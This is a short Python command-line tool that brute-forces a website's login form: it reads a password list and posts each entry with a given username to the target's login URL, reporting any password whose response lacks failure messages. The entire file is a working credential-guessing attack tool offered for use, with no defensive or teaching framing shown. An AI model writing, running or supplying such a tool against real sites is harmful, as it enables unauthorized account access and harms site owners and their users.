import requests
import argparse
from urllib.parse import urljoin

def brute_force_login(base_url, username, password_list):
    login_url = urljoin(base_url, "login")  # Adjust path if necessary
    with open(password_list, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove any extra spaces or newlines
        print(f"Trying password: {password}")
        response = requests.post(login_url, data={"username": username, "password": password})

        # Check for specific status code or error message for a failed login
        if response.status_code == 200:
            if "Invalid credentials" not in response.text and "Incorrect password" not in response.text:
                print(f"[SUCCESS] Password found: {password}")
                return password
            elif "Welcome" in response.text:  # Adjust this for a successful login indicator
                print(f"[SUCCESS] Password found: {password}")
                return password

    print("Brute force complete. No valid password found.")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Login page brute forcer.")
    parser.add_argument("-u", "--url", required=True, help="Base URL of the target site (e.g., https://example.com/)")
    parser.add_argument("--username", required=True, help="Username for the login.")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to the password list file.")

    args = parser.parse_args()

    brute_force_login(args.url, args.username, args.passwordlist)
